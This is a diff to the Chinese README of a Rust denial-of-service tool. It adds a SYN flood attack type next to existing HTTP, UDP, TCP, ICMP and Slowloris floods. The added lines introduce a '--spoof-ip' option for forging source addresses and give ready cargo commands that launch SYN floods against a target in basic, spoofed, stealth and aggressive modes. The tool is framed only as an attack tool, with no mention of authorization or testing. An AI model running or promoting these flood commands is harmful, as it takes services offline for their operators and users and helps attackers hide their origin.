@@ -18,7 +18,7 @@
 
 ## 功能特性
 
-- 🚀 **极高性能**: 支持HTTP/UDP/TCP/ICMP/Slowloris五大攻击类型，异步高并发
+- 🚀 **极高性能**: 支持HTTP/UDP/TCP/ICMP/Slowloris/SYN六大攻击类型，异步高并发
 - 📊 **实时监控**: 实时显示RPS（每秒请求数）和成功率
 - 🔧 **灵活配置**: 支持自定义目标、端口、并发数、持续时间、数据包大小
 - 📈 **详细统计**: 提供详细的攻击统计信息
@@ -30,6 +30,7 @@
 - 🌪️ **TCP洪水攻击**: 支持TCP洪水攻击，支持random/http/custom三种payload
 - 🎯 **ICMP洪水攻击**: 支持ICMP洪水攻击，支持伪装源IP和随机数据包大小
 - 🐌 **Slowloris攻击**: 支持低带宽高效攻击，通过保持慢速连接耗尽服务器资源
+- 🌊 **SYN洪水攻击**: 支持TCP SYN包洪水攻击，可伪造源IP
 - 💬 **交互模式**: 友好的交互式用户界面
 
 ## 安装和编译
@@ -83,7 +84,7 @@ cargo run --release -- --target example.com --port 443 --https
 | `--post-data` | | | POST请求的数据 |
 | `--user-agent` | | | 自定义User-Agent |
 | `--mode` | `-m` | normal | 攻击模式 (normal/stealth/aggressive) |
-| `--attack-type` | `-a` | http | 攻击类型 (http/udp/tcp/icmp/slowloris) |
+| `--attack-type` | `-a` | http | 攻击类型 (http/udp/tcp/icmp/slowloris/syn) |
 | `--packet-size` | | 1024 | UDP/TCP/ICMP数据包大小 |
 | `--payload-type` | | random | TCP负载类型 (random/http/custom) |
 | `--custom-payload` | | | TCP自定义负载内容 |
@@ -96,6 +97,7 @@ cargo run --release -- --target example.com --port 443 --https
 | `--random-headers` | | false | Slowloris随机头部 |
 | `--min-interval` | | 10 | Slowloris最小间隔（毫秒） |
 | `--max-interval` | | 50 | Slowloris最大间隔（毫秒） |
+| `--spoof-ip` | | false | SYN伪造源IP |
 | `--interactive` | `-i` | false | 启动交互模式 |
 
 ### 使用示例
@@ -161,6 +163,18 @@ cargo run --release -- --target example.com --port 80 --attack-type slowloris --
 # Slowloris攻击（隐蔽模式）
 cargo run --release -- --target example.com --port 80 --attack-type slowloris --mode stealth
 
+# SYN洪水攻击（基本）
+cargo run --release -- --target example.com --port 80 --attack-type syn --packet-size 1024
+
+# SYN洪水攻击（伪造源IP）
+cargo run --release -- --target example.com --port 80 --attack-type syn --spoof-ip --packet-size 1024
+
+# SYN洪水攻击（隐蔽模式）
+cargo run --release -- --target example.com --port 80 --attack-type syn --mode stealth --packet-size 512
+
+# SYN洪水攻击（激进模式）
+cargo run --release -- --target example.com --port 80 --attack-type syn --mode aggressive --connections 2000
+
 # 交互模式
 cargo run --release -- --interactive
 ```
@@ -196,6 +210,7 @@ cargo run --release -- --interactive
 | default_tcp_connections  | TCP 默认并发连接数 |
 | default_icmp_connections | ICMP 默认并发连接数 |
 | default_slowloris_connections | Slowloris 默认并发连接数 |
+| default_syn_connections | SYN 默认并发连接数 |
 | default_duration         | 默认攻击持续时间（秒） |
 | default_packet_size      | UDP/TCP/ICMP 默认数据包大小（字节） |
 | default_mode             | 默认攻击模式（normal/stealth/aggressive） |
